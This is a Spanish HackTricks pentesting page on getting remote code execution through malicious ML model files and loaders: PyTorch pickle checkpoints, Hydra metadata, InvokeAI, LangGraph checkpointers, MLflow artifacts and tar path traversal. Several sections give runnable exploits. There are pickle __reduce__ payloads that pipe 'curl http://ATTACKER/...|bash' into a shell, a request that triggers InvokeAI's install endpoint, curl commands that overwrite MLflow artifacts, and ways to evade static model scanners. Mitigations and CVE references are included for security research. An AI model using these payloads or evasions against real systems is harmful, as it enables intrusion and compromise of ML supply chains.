# Modelos RCE

{{#include ../banners/hacktricks-training.md}}

## Cargar modelos para RCE

Los modelos de Machine Learning suelen compartirse en distintos formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en los equipos de los desarrolladores o en sistemas de producción para utilizarlos. Por lo general, los modelos no deberían contener código malicioso, pero hay casos en los que un modelo puede usarse para ejecutar código arbitrario en el sistema, ya sea como una función prevista o debido a una vulnerabilidad en la biblioteca de carga del modelo.

La siguiente tabla enumera vulnerabilidades representativas de esta categoría:

| **Framework / Herramienta** | **Vulnerabilidad (CVE si está disponible)** | **Vector de RCE** | **Referencias** |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el checkpoint del modelo provoca la ejecución de código (eludiendo la protección `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de un modelo malicioso provoca la ejecución de código; RCE por deserialización de Java en la API de administración                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialización insegura del checkpoint mediante `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint no confiable activa un reducer de pickle durante `load_model_trainer_states_from_checkpoint` → ejecución de código en el worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | Inyección SQL + hook de extensión inseguro de MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La clave `filter` controlada por el usuario inyecta sintaxis SQL/JSON-path, `UNION SELECT` falsifica una fila de checkpoint y, luego, la deserialización de `msgpack` importa y llama código Python elegido por el atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar un modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar un modelo con una capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análisis de TFLite)                                                                                          | Un modelo `.tflite` manipulado provoca un desbordamiento de enteros → corrupción del heap (posible RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo mediante `joblib.load` ejecuta un pickle con el payload `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *disputado*                                                                              | El valor predeterminado de `numpy.load` permitía arrays de objetos serializados con pickle: un `.npy/.npz` malicioso provoca la ejecución de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (recorrido de directorios) <br> **CVE-2024-5187** (recorrido de tar)                                                    | La ruta de los pesos externos del modelo ONNX puede salir del directorio (lectura de archivos arbitrarios) <br> Un tar de modelo ONNX malicioso puede sobrescribir archivos arbitrarios (lo que puede llevar a RCE) | |
| ONNX Runtime (riesgo de diseño)  | *(Sin CVE)* Ops personalizadas de ONNX / flujo de control                                                                                    | Un modelo con un operador personalizado requiere cargar código nativo del atacante; los grafos de modelos complejos abusan de la lógica para ejecutar cálculos no previstos   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (recorrido de rutas)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite recorrer rutas relativas para escribir archivos (p. ej., sobrescribir `.bashrc` para RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (múltiples desbordamientos del heap)                                                                         | Un archivo de modelo GGUF malformado provoca desbordamientos del búfer del heap en el parser, lo que permite la ejecución de código arbitrario en el sistema víctima                     | |
| **Keras (formatos antiguos)**   | *(Sin CVE nueva)* Modelo Keras H5 heredado                                                                                         | Un modelo HDF5 (`.h5`) malicioso con una capa Lambda sigue ejecutando código al cargarse (el modo `safe_mode` de Keras no cubre el formato antiguo: «ataque de downgrade») | |
| **Otros** (general)        | *Falla de diseño* – serialización con Pickle                                                                                         | Muchas herramientas de ML (p. ej., formatos de modelo basados en pickle, `pickle.load` de Python) ejecutan código arbitrario incrustado en archivos de modelo, salvo que se tomen medidas de mitigación | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadatos no confiables pasados a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Los metadatos/configuración del modelo controlados por el atacante establecen `_target_` en un callable arbitrario (p. ej., `builtins.exec`) → se ejecuta durante la carga, incluso con formatos «seguros» (`.safetensors`, `.nemo`, `config.json` del repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Además, existen modelos basados en pickle de Python, como los utilizados por [PyTorch](https://github.com/pytorch/pytorch/security), que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por tanto, cualquier modelo basado en pickle puede ser especialmente susceptible a este tipo de ataques, aunque no aparezca en la tabla anterior.

### Evadir las comprobaciones estáticas en checkpoints basados en pickle

Una ruta de carga de modelos que llama a `pickle.load()`, `joblib.load()` o `torch.load(..., weights_only=False)` sin restricciones es un punto de ejecución, no simplemente un parser.<sup>[[22]](#references)</sup> En PyTorch 2.6, `torch.load()` usa `weights_only=True` de forma predeterminada cuando no se proporciona un módulo pickle personalizado; los ejemplos siguientes requieren un loader sin restricciones o una aplicación que desactive esta protección para cargar un objeto no compatible.<sup>[[4]](#references)</sup> Un resultado limpio del análisis estático no cambia ese límite.<sup>[[21]](#references)</sup>

Consulta [Python pickle deserialization](../pentesting-web/deserialization/#pickle) para ver el primitivo básico `__reduce__` y [Fickling's ML import allowlist](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) para las comprobaciones de importación en tiempo de ejecución.

#### Registrar un callable y luego resolverlo con `EXT2`

Un pickle puede invocar `copyreg.add_extension` mediante `REDUCE` para registrar un par módulo/nombre con un código de extensión numérico elegido por el atacante. Después, un `EXT2` resuelve ese código al callable, que otro `REDUCE` puede invocar. Por tanto, el callable crítico no es el operando de un opcode `GLOBAL` o `STACK_GLOBAL`. Binarly demostró esta técnica con `multiprocessing.util.spawnv_passfds`; cuatro de los cinco scanners evaluados no la detectaron, mientras que SaferPickle sí lo hizo. La modificación del registro y la resolución de `EXT2` ocurren dentro de la misma operación de unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Este es un esquema de opcodes, no un checkpoint completo: el cargador externo debe aceptar el flujo pickle que lo rodea. Un escáner que solo busca callables peligrosos en los operandos de `GLOBAL` no detecta la búsqueda posterior; un escáner sin compatibilidad con `EXT2` puede fallar antes de emitir un veredicto. Una allowlist estricta aún podría rechazar `copyreg.add_extension` en sí.<sup>[[21]](#references)</sup>

#### Ocultar tipos de objetos de código construidos detrás de funciones ordinarias

Otra cadena de pickle puede obtener `FunctionType` de `type(copy.copy)` y `CodeType` de `type(copy.copy.__code__)`; luego, construye un objeto de código a partir de bytecode proporcionado, lo envuelve como función y lo llama. La variante publicada obtiene `__code__` mediante `operator.methodcaller('__getattribute__', '__code__')`, por lo que el pickle no necesita importar ninguno de los dos constructores por nombre. La disposición de campos de `CodeType(...)` y el bytecode dependen de la versión de CPython; una carga útil creada para otro intérprete puede fallar antes de ejecutarse. SaferPickle marcó igualmente la muestra demostrada, pero la rebajó a `suspicious`; los otros cuatro escáneres evaluados no la detectaron.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Activar la carga de un segundo modelo desde un argumento pickle

Un pickle externo puede llamar a `torch.storage._load_from_bytes` y pasarle como argumento un modelo serializado proporcionado por un atacante. Esa función llama a `torch.load(io.BytesIO(b), weights_only=False)`, por lo que el modelo anidado se deserializa sin la restricción `weights_only`, aunque para un escáner de opcodes de nivel superior parezca que se pasan bytes a una única función. La carga externa debe permitir esa función; `weights_only=True` no hace que el pickle externo la acepte automáticamente. Los escáneres que no analizan recursivamente los bytes anidados pueden pasar por alto la cadena interna `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Resolver un nombre de módulo pickle heredado al cargar

Para los protocolos pickle anteriores a 3, el valor predeterminado `fix_imports=True` de Python asigna una referencia `GLOBAL` a `commands.run` a `subprocess.run` mediante `_compat_pickle.IMPORT_MAPPING`. Por tanto, un escáner que compare la cadena literal del módulo con una denylist de `subprocess` puede pasar por alto la función que se ejecuta en tiempo de ejecución. Esto requiere un cargador que conserve la asignación de compatibilidad y acepte los argumentos resultantes de la llamada.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Hacer que un checkpoint que no sea ZIP evada un escáner que solo analiza ZIP

La selección del formato puede fallar independientemente de la inspección de opcodes: Binarly descubrió que ModelScan 0.8.8 dirigía los archivos `.bin`, `.pt`, `.pth` y `.ckpt` a un escáner de PyTorch específico para ZIP, y omitía un flujo pickle que no era ZIP en vez de recurrir a su escáner de pickle normal. También documentó un diseño heredado de modelo TAR que `torch.load()` acepta, pero que ModelScan y JFrog no inspeccionaban. Estas son deficiencias específicas de determinadas versiones de los escáneres, no características de todos los escáneres de modelos.<sup>[[21]](#references)</sup>

#### Ejecutar código antes de que un analizador estático llegue a un final malformado

Un escáner que recorra por completo un pickle con `pickletools.genops()` puede generar una excepción al encontrar un opcode truncado después de un `REDUCE` válido. El unpickler sin restricciones ya habrá invocado la función antes de llegar a ese final, aunque la carga completa termine generando una excepción. En el ejemplo documentado, se colocó un `BINUNICODE` truncado justo después del `REDUCE` que ejecutaba el código; esto hizo que `pickletools.genops()` fallara cuando ya se había producido el efecto secundario de escritura en un archivo. Esto solo permite evadir un escáner si este considera que el error de análisis indica que el archivo es seguro o lo omite. Solo es útil cuando el efecto secundario importa aunque no se devuelva correctamente un modelo; un objetivo que requiera que la carga se complete podría rechazar el artefacto.<sup>[[21]](#references)</sup>

### Metadatos de Hydra → RCE (funciona incluso con safetensors)

`hydra.utils.instantiate()` importa y llama a cualquier `_target_` con notación de puntos en un objeto de configuración/metadatos. Cuando bibliotecas como Hugging Face Transformers pasan **metadatos de modelo no confiables** a `instantiate()`, un atacante puede proporcionar una función y argumentos que se ejecuten inmediatamente durante la carga del modelo (no se necesita pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Ejemplo de payload (funciona en `model_config.yaml` de `.nemo`, en `config.json` de un repositorio o en `__metadata__` dentro de `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Puntos clave:
- Se activa antes de la inicialización del modelo en `restore_from/from_pretrained` de NeMo, los codificadores de HuggingFace de uni2TS y los cargadores de FlexTok.
- La lista de bloqueo de cadenas de Hydra se puede eludir mediante rutas de importación alternativas (p. ej., `enum.bltns.eval`) o nombres resueltos por la aplicación (p. ej., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok también analiza metadatos convertidos en cadenas con `ast.literal_eval`, lo que permite un DoS (consumo excesivo de CPU/memoria) antes de la llamada a Hydra.

### 🆕  RCE en InvokeAI mediante `torch.load` (CVE-2024-12029)

`InvokeAI` es una interfaz web popular de código abierto para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install`, que permite a los usuarios descargar y cargar modelos desde URL arbitrarias.<sup>[[1]](#references)</sup>

Internamente, el endpoint acaba llamando a:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Cuando el archivo suministrado es un **checkpoint de PyTorch (`*.ckpt`)**, `torch.load` realiza una **deserialización de pickle**. Como el contenido proviene directamente de la URL controlada por el usuario, un atacante puede incluir un objeto malicioso con un método personalizado `__reduce__` dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que provoca **ejecución remota de código (RCE)** en el servidor de InvokeAI.

La vulnerabilidad recibió el identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Recorrido de explotación

1. Crea un checkpoint malicioso:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej., `http://ATTACKER/payload.ckpt`).
3. Activa el endpoint vulnerable (no se requiere autenticación):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → se ejecuta el gadget `os.system` y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Exploit listo para usar: el módulo de **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el proceso.<sup>[[3]](#references)</sup>

#### Condiciones

•  InvokeAI 5.3.1-5.4.2 (el valor predeterminado de la opción de escaneo es **false**)
•  `/api/v2/models/install` accesible para el atacante
•  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigaciones

* Actualizar a **InvokeAI ≥ 5.4.3**: el parche establece `scan=True` de forma predeterminada y realiza un escaneo de malware antes de la deserialización.<sup>[[2]](#references)</sup>
* Al cargar checkpoints mediante programación, usar `torch.load(file, weights_only=True)` o el nuevo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplicar listas de permitidos / firmas a las fuentes de modelos y ejecutar el servicio con privilegios mínimos.

> ⚠️ Recuerda que **cualquier** formato basado en pickle de Python (incluidos muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es intrínsecamente inseguro para deserializar desde fuentes no confiables.

---

Ejemplo de mitigación improvisada si debes mantener versiones antiguas de InvokeAI en funcionamiento detrás de un proxy inverso:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE en NVIDIA Merlin Transformers4Rec mediante `torch.load` inseguro (CVE-2025-23298)

Transformers4Rec de NVIDIA (parte de Merlin) exponía un cargador de checkpoints inseguro que llamaba directamente a `torch.load()` con rutas proporcionadas por el usuario. Como `torch.load` depende de Python `pickle`, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.<sup>[[5]](#references)</sup>

Ruta vulnerable (antes de la corrección): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto permite RCE: en Python `pickle`, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve una función ejecutable y argumentos. La función se ejecuta durante la deserialización. Si un checkpoint contiene un objeto de este tipo, se ejecuta antes de que se utilice ningún peso.

Ejemplo mínimo de checkpoint malicioso:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vectores de entrega y radio de impacto:
- Checkpoints/modelos troyanizados compartidos mediante repositorios, buckets o registros de artefactos
- Pipelines automatizados de reanudación/despliegue que cargan checkpoints automáticamente
- La ejecución se produce dentro de workers de entrenamiento/inferencia, a menudo con privilegios elevados (p. ej., root en contenedores)

Corrección: El commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó la llamada directa a `torch.load()` por un deserializador restringido con una lista de permitidos, implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida los tipos y campos, e impide que se invoquen callables arbitrarios durante la carga.<sup>[[7]](#references)</sup>

Recomendaciones defensivas específicas para checkpoints de PyTorch:
- No deserialices datos no confiables con pickle. Cuando sea posible, prefiere formatos no ejecutables, como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX.
- Si debes usar la serialización de PyTorch, asegúrate de que `weights_only=True` (compatible con versiones más recientes de PyTorch) o usa un unpickler personalizado con una lista de permitidos, similar al parche de Transformers4Rec.<sup>[[4]](#references)</sup>
- Verifica la procedencia/las firmas del modelo y aplica sandboxing a la deserialización (seccomp/AppArmor; usuario sin privilegios de root; sistema de archivos restringido y sin tráfico de salida a la red).
- Supervisa la creación de procesos secundarios inesperados por parte de los servicios de ML al cargar checkpoints; rastrea el uso de `torch.load()`/`pickle`.

Referencias de POC y versiones vulnerable/parcheada:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerable anterior al parche: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader posterior al parche: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Ejemplo – crear un modelo malicioso de PyTorch

- Crear el modelo:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Carga el modelo:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialización de Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

El endpoint `resnet` de FaceDetection-DSFD de Tencent deserializa datos controlados por el usuario. ZDI confirmó que un atacante remoto puede inducir a una víctima a cargar una página o archivo malicioso, hacer que envíe un blob serializado manipulado a ese endpoint y activar la deserialización como `root`, lo que lleva al compromiso total.

El flujo del exploit replica el abuso típico de pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Cualquier gadget accesible durante la deserialización (constructores, `__setstate__`, callbacks del framework, etc.) puede weaponizarse de la misma manera, independientemente de si el transporte era HTTP, WebSocket o un archivo depositado en un directorio vigilado.



### LangGraph checkpointer SQLi → MessagePack RCE

Esta cadena de ataque es interesante porque el atacante **no necesita subir un archivo de modelo malicioso**. En su lugar, la aplicación expone una **API de persistencia de agentes de IA** (`get_state_history(..., filter=...)`) y la entrada del usuario llega al constructor de consultas del checkpointer.

#### 1. SQLi estructural en filtros de metadatos

Un patrón vulnerable de SQLite era:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

El valor se vincula más adelante, pero `query_key` se concatena en la **cadena de la ruta JSON**, por lo que un `'` dentro de la clave del diccionario sale de `'$.{query_key}'` e inyecta SQL. La misma lección se aplica a **las rutas JSON, los identificadores, los operadores, `LIMIT` y los campos TTL**: los placeholders solo protegen los valores, no la sintaxis estructural de las consultas.

#### 2. `UNION SELECT` puede apuntar a sinks posteriores, no solo al robo de datos

La consulta devuelve `type` y bytes de `checkpoint` serializados, que luego se consumen como:

```python
self.serde.loads_typed((type, checkpoint))
```

Esto significa que una SQLi en la cláusula `WHERE` puede inyectar una **fila de resultados falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Si el código posterior analiza, deserializa, escribe o ejecuta alguna columna seleccionada, asigna esas columnas a sus sinks. En este caso, la fila falsa convierte la SQLi en **deserialización controlada por el atacante**.

#### 3. Los hooks de extensión inseguros de MessagePack equivalen a gadgets de código

La ruta `msgpack` de LangGraph usaba un hook de extensión personalizado que desempaquetaba una tupla anidada y ejecutaba:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

So un objeto de extensión MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resuelve `system` y ejecuta el comando. Al revisar frameworks de AI, inspecciona los **revivers personalizados de MessagePack/JSON/pickle** en busca de imports dinámicos, reflection o dispatch arbitrario de callables.

#### 4. Patrón de auditoría práctico para frameworks de agentes

Revisa cualquier entrada controlada por el usuario que llegue a:
- APIs de historial de estado / memory / replay / listado de checkpoints
- constructores de filtros estructurados que generen SQL o fragmentos de consultas de Redis
- deserializadores personalizados (`pickle`, `msgpack`, hooks de objetos de `json`, constructores de YAML)
- rutas de recuperación que confíen en las filas devueltas por la capa de persistencia

Esta cadena específica afectó a implementaciones de LangGraph self-hosted que usaban checkpointers de **SQLite** o **Redis** cuando usuarios no confiables podían controlar `filter`. Las versiones corregidas indicadas en la divulgación fueron `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` y `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Sobrescritura de artifacts PyFunc de MLflow que conduce a RCE mediante pickle

Un PyFunc de MLflow creado a partir de un `PythonModel` puede almacenar el objeto serializado como `python_model.pkl`. Los metadatos del modelo indican `mlflow.pyfunc.model` como su loader, y la implementación de MLflow usa este nombre de archivo para el modelo Python guardado. Por consiguiente, el acceso de escritura al artifact store puede convertirse en ejecución de código en otra aplicación que cargue el modelo posteriormente.<sup>[[17]](#references)[[18]](#references)</sup>

La cadena útil es **permiso de escritura en el artifact → reemplazar el pickle → hacer que un consumidor de inferencias lo vuelva a cargar**. Para un experimento que use una raíz `mlflow-artifacts:/...` con proxy, enumera el experimento, la ejecución y la ruta del artifact del modelo. El servidor de tracking expone `GET` y `PUT` en `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Un reducer mínimo puede ejecutar un comando en cuanto el consumidor deserializa el artefacto con `pickle`. Generar el payload con la versión de Python declarada en `MLmodel` evita problemas de compatibilidad.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Activa la operación que **carga el modelo existente**, como la predicción, la puntuación o el despliegue. No vuelvas a entrenarlo antes, porque el entrenamiento podría reemplazar el artefacto malicioso por un modelo nuevo. Un error de la aplicación no descarta la explotación: el reducer devuelve el código de salida entero del comando en lugar de un modelo utilizable. Empieza con un efecto secundario observable, como un ping ICMP o una callback HTTP, y luego sustitúyelo por el payload final.<sup>[[20]](#references)</sup>

Durante la evaluación, distingue entre el permiso para crear un run y el permiso para sobrescribir artefactos que pertenecen a otro run. Revisa la autenticación y los permisos de actualización por run, inspecciona las modificaciones inesperadas de `python_model.pkl` y considera la procedencia e integridad del modelo como parte del límite de ejecución. El código actual de MLflow también permite establecer `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` y recomienda usar artefactos models-from-code en lugar de cargar datos de cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Servidores de modelos expuestos e infraestructura de ML

Cargar un modelo malicioso no es la única forma de ejecutar código en infraestructura de ML. Las API de envío de trabajos, los endpoints de validación de código y las descargas del registro de modelos de servicios de IA autohospedados pueden permitir la ejecución de código sin ningún archivo de modelo. Consulta [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelos a Path Traversal

Como se comenta en [**esta entrada de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelo usados por distintos frameworks de IA se basan en archivos comprimidos, normalmente `.zip`. Por lo tanto, podría ser posible abusar de estos formatos para llevar a cabo ataques de Path Traversal y leer archivos arbitrarios del sistema en el que se carga el modelo.<sup>[[16]](#references)</sup>

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` al cargarse:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

O bien, con el siguiente código puedes crear un modelo que creará un symlink al directorio `/tmp` cuando se cargue:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Análisis en profundidad: deserialización de Keras .keras y búsqueda de gadgets

Para una guía centrada en los aspectos internos de .keras, RCE mediante capas Lambda, el problema de importación arbitraria en ≤ 3.8 y el descubrimiento de gadgets dentro de la allowlist después de la corrección, consulta:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog de OffSec – "CVE-2024-12029 – Deserialización de datos no confiables en InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de corrección de InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentación del módulo de Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – consideraciones de seguridad para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog de ZDI – CVE-2025-23298: obtención de ejecución remota de código en NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Aviso de ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de corrección de Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader vulnerable antes de la corrección (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader después de la corrección (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers de Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Ejecución remota de código con formatos y bibliotecas modernos de AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentación de Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit de la block-list de Hydra (advertencia sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi a RCE: explotación del checkpointer de LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Cómo convertir errores de archive slip en recompensas de alto valor en AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Aviso de Snyk y prueba de concepto de PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Código fuente de MLflow – `model.py` de PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST de MLflow – endpoints de descarga y carga de artefactos](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taxonomía de evasión del escáner estático MLTracer de Binarly](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – detección de modelos maliciosos con MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Implementación de `_load_from_bytes` de PyTorch storage](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Mapeo de compatibilidad de `find_class` de pickle de CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Mapeo de importación de `_compat_pickle` de CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
